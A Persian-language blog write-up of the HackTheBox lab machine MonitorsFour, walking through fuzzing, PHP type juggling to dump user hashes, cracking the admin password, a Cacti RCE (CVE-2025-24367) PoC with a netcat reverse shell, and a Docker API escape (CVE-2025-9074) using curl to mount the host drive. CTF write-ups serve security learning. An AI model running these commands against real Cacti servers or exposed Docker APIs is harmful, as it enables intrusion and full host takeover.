---
author: "amir_rabiee"
pubDatetime: 2025-12-10T15:46:45.51
modDatetime: 2025-12-11T12:46:45.51
title: "گزارش کامل از حل MonitorsFour - HTB"
featured: false
draft: false
archived: false
tags:
  - hackthebox
  - writeup
  - cve
  - fuzzing
description: "برچسب 'Easy' اما نه چندان ساده"
---

## فهرست مطالب

## مقدمه

توی این مقاله اولین تجربه ام رو با یه CTF خوب توی پلتفرم HackTheBox رو کامل مستند میکنم. این ماشین جزو ماشین های هفتگی مراسم Seasonal بود و خب من فرصت نکردم به موقع وارد مسابقات بشم. این یکی مونده به آخری بود. و با اینکه برچسب Easy داشت... چندان ساده نبود. سطح ماشین های HTB در مقایسه با بقیه پلتفرم ها یخورده بالاتره و از طرفی هم توی Seasonal سطح باز یخورده از معمول بالاتر. همچنین اینو هم بگم که ازونجایی که این ماشین live بود هیچ writeup و راه  حلی طبیعتا براش توی اینترنت یا یوتیوب نبود که بریم کمک بگیریم، جمعا برای من این ماشین حداقل medium به بالا بود از لحاظ دشواری.

همین ماشین به ظاهر ساده چیز های زیاد و مهمی رو بهمون یاد میده: از فازینگ و enumeration تا پیدا کردن CVE های مرتبط و کرک کردن پسورد و گرفتن RCE و در کل chain کردن حمله های مختلف تا رسیدن به Privilate Escalation.

خالی از لطف نیست که بگم هر دو CVE استفاده شده توی این CTF مال 2025 بودن :))

## Reconnaissance

### nmap
اولین قدم مثل همیشه... اینکه ببینیم روی این IP چه سرویس هایی در حال اجرا هست ...

```bash
nmap  10.10.11.98
```

یه nmap زدم و دیدم که یه winrm و nginx در حال اجراست. وجود winrm به ما این نکته رو میده که احتمالا هاست از یه windows linux subsystem استفاده میکنه برای سرویس هاش. 

با یه درخواست wget متوجه میشیم که redirect میشه به آدرس monitorsfour.htb
و خب ازونجایی که طبیعتا DNS این دامنه resolve نمیشه باید اونو به hosts سیستم اضافه کرد.

```bash
echo "10.10.11.98 monitorsfour.htb" >> /etc/hosts
```

حالا با یه landing page مواجه میشیم که یه سری صفحه درباره و لاگین و ... داره.

جلوتر، با تلاش های بسیار payload های دستی و sqlmap به این نتیجه رسیدم که فرم لاگین SQLi نمی خوره :)
### fuzzing 

در ادامه یه یه فازینگ روی مسیر های دامنه انجام دادم

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -u http://monitorsfour.htb/FUZZ -mc all -fc 404,400
```

از نتیجه این مشاهده شد که یه سری مسیر users, user, login, admin و همچنین env. قابل دسترسی هستن

خیلی مسخره بود که env. همینطوری ساده گذاشته بودن :)) ولی خب بدرد نخورد در نهایت
```
DB_HOST=mariadb
DB_PORT=3306
DB_NAME=monitorsfour_db
DB_USER=monitorsdbuser
DB_PASS=f*********
```

#### PHP Type Juggling

با درخواست زدن به users در جواب `missing token` گرفتم. گذاشتن یه مقدار برای ?token هم پاسخ 	`invalid or missing token` رو داد. ازونجایی که میدونیم محیط از PHP 8.3.27 داره استفاده میکنه، میتونیم از Type Juggling بهره ببریم. توی php، مقایسه با `==` منجرب به تبدیل تایپ در زمان مقایسه میشه بر خلاف `===`.

```bash
ffuf -c -u http://monitorsfour.htb/user?token=FUZZ -w php_loose_comparison.txt -fw 4
```

با یه فازینگ مجدد سعی میکنیم یه مقدار مناسب برای Type Juggling پیدا کنیم. مقدار 0 جوابه و احتمالا توکن ها با 0e شروع میشن که این نوع وقتی تبدیل به integer بشه به عنوان نمایش علمی در نظر گرفته میشه و 0 == 0.0 در نهایت true میشه.

```bash
curl http://monitorsfour.htb/users?token=0
```

این تمام کاربرا رو همراه با هش پسورد شون برگردوند :))

#### hashcat
کاربر admin برای ما جالب تره. با بررسی هش رمز عبورش متوجه میشیم که MD5 هست و با hashcat و وردلیست rockyou سعی می کنیم کرکش کنیم.

```bash
hashcat -m 0 56b32eb43e6f15395f6c46c1c9e1cd36 /usr/share/wordlists/rockyou.txt
```

کرک میشه به راحتی. رمز عبور : wonderful1
همچنین یادم نره اینو بگم که توی مشخصات کاربران که بدست آوردیم، درکنار نام کاربری نام و نام خانوادگی ادمین Marcus Higgins بود.


با این مشخصات توی فرم login انجام دادم و وارد پنل ادمین شدم. توی پنل یه نکته خیلی خیلی مهم بود. توی changelog شون نوشته بودن که از docker 4.44.2 دارن استفاده میکنن. این نسخه داکر یه CVE داره. [CVE-2025-9074](https://nvd.nist.gov/vuln/detail/CVE-2025-9074)

با بررسی های بیشتر متوجه شدم که قطعه های دیگه پازل جای دیگه هست و کارمون اینجا تقریبا تمومه. 

#### vhost Fuzzing

با یه فازینگ مجدد روی vhost ها این دفعه نتیجه جالبی بدست اومد:


```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://monitorsfour.htb -H "Host:FUZZ.monitorsfour.htb" -fs 4 -ac
```

- دقت کنید استفاده از فلگ ac مهمه

نتیجه این دستور: `cacti [Status: 302]`

حالا فهمیدیم که روی `cacti.monitorsfour.htb` یه نسخه از cacti سرو شده و آدرسش رو باز می کنیم. (حواستون باشه باید اینو هم به hosts اضافه کرد )

برای لاگین از admin و همون پسورد wonderful1 که بدست آوردم استفاده کردم و جواب نداد. ولی نام کاربری رو میتونیم از اطلاعات قبلی حدس بزنیم که مال آقای Marcus Higgins هست پس ترکیب هایی ازین رو امتحان میکنیم. marcus:wonderful1 جواب بود و به cacti ورود کردیم.

## RCE - Cacti 1.2.28

این نسخه از Cacti یه CVE جدید داره. [CVE-2025-24367](https://nvd.nist.gov/vuln/detail/CVE-2025-24367)


با یه سرچ ساده تونستم یه PoC برای این پیدا کنم که بهمون یه RCE بده. رپو رو اینجا میزارم توضیحات بیشتر داخل هست [CVE-2025-24367-Cacti-PoC](https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC)

```bash
python3 poc.py -u marcus -p wonderful1 -i 10.10.14.147 -l 1234 -url http://cacti.monitorsfour.htb
```

فقط قبل از اجرای این باید nc listener در حال اجرا باشه...

```bash
nc -lvnp 1234
```


حالا تونستیم یه reverse-shell بگیریم. با بررسی hostname متوجه میشیم که داخل یه کانتینر داکر هستیم با این آیدی: 821fbd6a43fa

### User flag


تو این نقطه با مسیر یابی به home/ میتونیم user.txt رو بخونیم و پرچم یوزر رو بدست بیاریم. تا اینجا شد نصف کار.
## Privilate Escalation
قبل تر که اشاره کردم، CVE-2025-9074 (Docker API Escape) به ما اجازه میده با interface داخلی خود داکر ارتباط برقرار کنیم و یه کانتینر جدید ایجاد کنیم که مسیر /:C ویندوز رو توی volume ها سوار کرده باشه.
این API داکر روی `http://192.168.65.7:2375` هست که ازش بهره برداری میکنیم


ابتدا image های موجود داکر رو بررسی میکنیم:

```bash
curl http://192.168.65.7:2375/images/json
```

یه کانتینر privilage شده ایجاد میکنیم: 
```bash
curl -X POST http://192.168.65.7:2375/containers/create?name=pwn2 \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine:latest","Cmd":["/bin/sh","-c","while true; do sleep 3600; done"],"HostConfig":{"Privileged":true,"Binds":["/run/desktop/mnt/host/c:/host"]}}'
```

کانتینر رو استارت میزنیم:
```bash
curl -X POST http://192.168.65.7:2375/Container_ID/821fbd6a43fa/start
```

### Root flag
یه Exec ID میگیریم:
```bash
curl -X POST http://192.168.65.7:2375/containers/Container_ID/exec \
  -H "Content-Type: application/json" \
  -d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["cat","/host/Users/Administrator/Desktop/root.txt"]}'
```
حالا Exec ID رو توی این دستور پایین به این صورت استارت میزنیم و فلگ root رو هم بدست میاریم :))
```bash
curl -X POST http://192.168.65.7:2375/exec/EXEC_ID/start -H "Content-Type: application/json" -d '{"Detach":false,"Tty":false}'
```

و تمام. این مرحله داکر بیشتر از چیزی که میخوام اعتراف کنم طول کشید چون با نحوه کار سیستم های داخلی داکر آشنا نبودم و نکته همین  Exec ID گرفتن و دستور اجرا کردن بود. ولی توی همین چند خط خلاصه میشه کار.


ممکنه جایی اشتباه کرده باشم توی گزارش چون در حین حل چیزی رو مستند نکردم و هر چی خاطرم بود رو دوباره نوشتم، 

تو کامنت های زیر بهم بگید و همچنین پیشنهاد ها و راه حل های خودتون رو هم با من درمیون بزارید. 
